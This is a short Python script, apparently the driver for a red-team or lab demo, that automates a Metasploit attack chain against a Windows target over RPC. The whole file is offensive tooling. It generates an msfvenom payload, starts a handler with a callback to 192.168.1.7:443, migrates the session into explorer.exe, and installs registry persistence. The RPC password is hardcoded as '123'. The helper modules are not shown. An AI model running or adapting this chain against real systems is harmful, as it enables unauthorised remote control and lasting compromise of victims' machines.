from time import sleep
import library.msf_session_list as session_list
from library.pymetasploit3.msfrpc import MsfRpcClient
import stage2.payloadDelivery.multi.msfvenom as msfvenom
import stage3.internalC2.windows.migrate64 as migrate64
import stage3.persistence.registry.persistence as persistence

#os.system('./init.sh')
#sleep(20)
client = MsfRpcClient("123",port=55552)

def main():
    
    # INITIALISING THE REQUIRED COMPONENT IN THE DEMO: DOMAIN CONTROLLER
    dc = ''

    #YJ Stage 2
    #Create msfvenom exe and start handler
    msfvenom.init(client) 
    sid = session_list.init(client, lhost='192.168.1.7:443')

    #YJ Stage 3
    #Migrate to explorer.exe
    migrate64.init(client,sid)
    #Establish persistence
    persistence.init(client,sid)


print("[*][*] THIS PROGRAM IS AN AUTOMATION BASED ON THE SCENARIO SHOWN [*][*]")
sleep(3)
main()